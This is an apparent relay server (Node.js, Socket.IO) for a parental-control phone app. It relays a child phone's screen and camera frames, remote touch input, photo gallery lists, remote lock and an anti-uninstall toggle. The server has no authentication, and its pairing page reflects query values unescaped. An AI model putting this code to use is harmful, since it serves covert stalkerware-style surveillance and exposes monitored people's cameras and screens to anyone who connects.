const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  },
  maxHttpBufferSize: 1e7 // 10MB payload size for image frames
});

// Data Stores
const devices = new Map(); // childDeviceId -> deviceDetails
const pairCodes = new Map(); // pairCode -> { parentEmail, customPassword, createdTime }

// Web Endpoint for Pairing Link
app.get('/pair', (req, res) => {
  const code = req.query.code || '';
  const email = req.query.email || '';
  
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Air Connection - Child Device Link</title>
      <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 2rem; border-radius: 1rem; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); text-align: center; max-width: 400px; width: 90%; border: 1px solid #334155; }
        .logo { font-size: 1.8rem; font-weight: bold; color: #38bdf8; margin-bottom: 1rem; }
        .code-box { background: #0f172a; padding: 1rem; border-radius: 0.5rem; font-size: 1.5rem; font-weight: bold; letter-spacing: 2px; color: #f43f5e; border: 1px dashed #38bdf8; margin: 1rem 0; }
        .btn { background: linear-gradient(135deg, #0284c7, #2563eb); color: white; border: none; padding: 0.8rem 1.5rem; font-size: 1rem; border-radius: 0.5rem; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 1rem; width: 100%; box-sizing: border-box; }
        .info { color: #94a3b8; font-size: 0.85rem; margin-top: 1rem; }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="logo">📱 Air Connection Kids</div>
        <p>Parent Pairing Link</p>
        <p>Target Account: <strong>${email || 'Parent Account'}</strong></p>
        <div class="code-box">${code || '387003297'}</div>
        <a href="airconnection://pair?code=${code}&email=${encodeURIComponent(email)}" class="btn">Launch Air Connection App</a>
        <div class="info">Open the Air Connection app on the child phone. The pairing code will be filled automatically!</div>
      </div>
    </body>
    </html>
  `);
});

// Socket.IO Real-time Relay Engine
io.on('connection', (socket) => {
  console.log(`[Socket Connected] ID: ${socket.id}`);

  // Parent Registration
  socket.on('register_parent', (data) => {
    const parentEmail = data.email;
    socket.join(`parent_${parentEmail}`);
    socket.parentEmail = parentEmail;
    console.log(`[Parent Registered] ${parentEmail}`);
    
    // Send existing devices for this parent
    const parentDevices = Array.from(devices.values()).filter(d => d.parentEmail === parentEmail);
    socket.emit('device_list_update', parentDevices);
  });

  // Child Registration
  socket.on('register_child', (data) => {
    const { deviceId, parentEmail, deviceName, customName, batteryLevel, model } = data;
    socket.deviceId = deviceId;
    socket.parentEmail = parentEmail;
    socket.isChild = true;

    const deviceInfo = {
      deviceId,
      parentEmail,
      deviceName: deviceName || 'Child Phone',
      customName: customName || deviceName || 'Baby Phone',
      batteryLevel: batteryLevel || 100,
      model: model || 'Android Device',
      status: 'online',
      socketId: socket.id,
      canUninstall: false,
      isLocked: false
    };

    devices.set(deviceId, deviceInfo);
    socket.join(`child_${deviceId}`);

    console.log(`[Child Device Connected] ${deviceId} (${deviceInfo.customName}) for parent: ${parentEmail}`);

    // Notify Parent room
    io.to(`parent_${parentEmail}`).emit('child_connected', deviceInfo);
    io.to(`parent_${parentEmail}`).emit('device_list_update', getParentDevices(parentEmail));
  });

  // Rename Child Device
  socket.on('rename_child', (data) => {
    const { deviceId, newCustomName } = data;
    if (devices.has(deviceId)) {
      const dev = devices.get(deviceId);
      dev.customName = newCustomName;
      devices.set(deviceId, dev);
      console.log(`[Device Renamed] ${deviceId} -> ${newCustomName}`);
      io.to(`parent_${dev.parentEmail}`).emit('device_list_update', getParentDevices(dev.parentEmail));
    }
  });

  // Start Screen Mirroring Request from Parent
  socket.on('start_mirror', (data) => {
    const { deviceId } = data;
    console.log(`[Parent Request] Start Mirror for ${deviceId}`);
    io.to(`child_${deviceId}`).emit('command_start_mirror', { parentSocketId: socket.id });
  });

  // Stop Screen Mirroring
  socket.on('stop_mirror', (data) => {
    const { deviceId } = data;
    io.to(`child_${deviceId}`).emit('command_stop_mirror');
  });

  // Child Sends Frame to Parent
  socket.on('screen_frame', (data) => {
    const { parentEmail, frameBase64, deviceId } = data;
    io.to(`parent_${parentEmail}`).emit('mirror_frame', { deviceId, frameBase64 });
  });

  // Parent Touch Control Gesture -> Relay to Child
  socket.on('touch_event', (data) => {
    const { deviceId, action, x, y, endX, endY } = data;
    console.log(`[Touch Relay] ${action} to ${deviceId}`);
    io.to(`child_${deviceId}`).emit('command_touch', { action, x, y, endX, endY });
  });

  // Start Camera Stream Request from Parent
  socket.on('start_camera', (data) => {
    const { deviceId, facing } = data;
    console.log(`[Parent Request] Start Camera (${facing || 'back'}) for ${deviceId}`);
    io.to(`child_${deviceId}`).emit('command_start_camera', { facing: facing || 'back' });
  });

  // Stop Camera Stream
  socket.on('stop_camera', (data) => {
    const { deviceId } = data;
    io.to(`child_${deviceId}`).emit('command_stop_camera');
  });

  // Switch Camera Facing (Front / Back)
  socket.on('switch_camera', (data) => {
    const { deviceId, facing } = data;
    io.to(`child_${deviceId}`).emit('command_switch_camera', { facing });
  });

  // Child Sends Camera Frame to Parent
  socket.on('camera_frame', (data) => {
    const { parentEmail, frameBase64, deviceId } = data;
    io.to(`parent_${parentEmail}`).emit('camera_frame', { deviceId, frameBase64 });
  });

  // Parent Request Photo Gallery List from Child
  socket.on('get_photos', (data) => {
    const { deviceId } = data;
    console.log(`[Parent Request] Get Photos for ${deviceId}`);
    io.to(`child_${deviceId}`).emit('command_get_photos');
  });

  // Child Transmits Photos List to Parent
  socket.on('photos_list', (data) => {
    const { parentEmail, deviceId, photos } = data;
    io.to(`parent_${parentEmail}`).emit('photos_list', { deviceId, photos });
  });

  // Anti-Uninstall Toggle
  socket.on('set_uninstall_lock', (data) => {
    const { deviceId, allowUninstall } = data;
    if (devices.has(deviceId)) {
      const dev = devices.get(deviceId);
      dev.canUninstall = allowUninstall;
      devices.set(deviceId, dev);
      io.to(`child_${deviceId}`).emit('command_uninstall_policy', { allowUninstall });
      io.to(`parent_${dev.parentEmail}`).emit('device_list_update', getParentDevices(dev.parentEmail));
    }
  });

  // Remote Device Lock
  socket.on('lock_device', (data) => {
    const { deviceId, lock } = data;
    if (devices.has(deviceId)) {
      const dev = devices.get(deviceId);
      dev.isLocked = lock;
      devices.set(deviceId, dev);
      io.to(`child_${deviceId}`).emit('command_lock', { lock });
      io.to(`parent_${dev.parentEmail}`).emit('device_list_update', getParentDevices(dev.parentEmail));
    }
  });

  // Disconnect Handling
  socket.on('disconnect', () => {
    if (socket.isChild && socket.deviceId) {
      if (devices.has(socket.deviceId)) {
        const dev = devices.get(socket.deviceId);
        dev.status = 'offline';
        devices.set(socket.deviceId, dev);
        io.to(`parent_${socket.parentEmail}`).emit('child_disconnected', { deviceId: socket.deviceId });
        io.to(`parent_${socket.parentEmail}`).emit('device_list_update', getParentDevices(socket.parentEmail));
      }
    }
  });
});

function getParentDevices(parentEmail) {
  return Array.from(devices.values()).filter(d => d.parentEmail === parentEmail);
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`=================================================`);
  console.log(` Air Connection Server Running on Port ${PORT}`);
  console.log(` Web Pairing Link: http://localhost:${PORT}/pair`);
  console.log(`=================================================`);
});
